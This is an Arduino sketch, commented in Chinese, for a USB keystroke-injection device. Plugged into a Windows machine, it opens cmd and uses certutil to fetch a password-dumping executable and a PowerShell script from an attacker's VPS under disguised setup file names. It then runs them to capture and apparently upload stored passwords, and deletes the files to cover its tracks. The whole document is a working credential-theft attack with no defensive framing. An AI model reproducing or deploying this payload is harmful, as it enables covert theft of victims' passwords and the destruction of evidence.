#include<Keyboard.h>
void setup()
{
  Keyboard.begin();//初始化键盘通讯
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键
  Keyboard.press('r');//r键
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("CMD");
  delay(1000);
  Keyboard.println("certutil -urlcache -split -f http:<YOU VPS>/KissGeek/PASSTOOLS.EXE d:\\setup_11.5.0.exe");//下载密码截取工具,因为开启了大小写混淆所以说这里要大写
  delay(10000);
  Keyboard.println("certutil -urlcache -split -f http:<YOU VPS>/KissGeek/PassUp.PS1 d:\\setup_11.5.0.PS1");//下载powershell脚本
  delay(1000);
  Keyboard.println("d:\\SETUP_11.5.0.EXE ALL > d:\\pass.txt");//获取的密码放到pass.txt
  delay(500);
  Keyboard.println("POWERSHELL d:\\SETUP_11.5.0.PS1");
  Keyboard.println("DEL d:\\pass.txt,d:\\setup_11.5.0.PS1,d:\\setup_11.5.0.exe");//删除程序
  Keyboard.println("EXIT");//退出powershell
  Keyboard.println("EXIT");//退出cmd
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯
}
void loop() {}
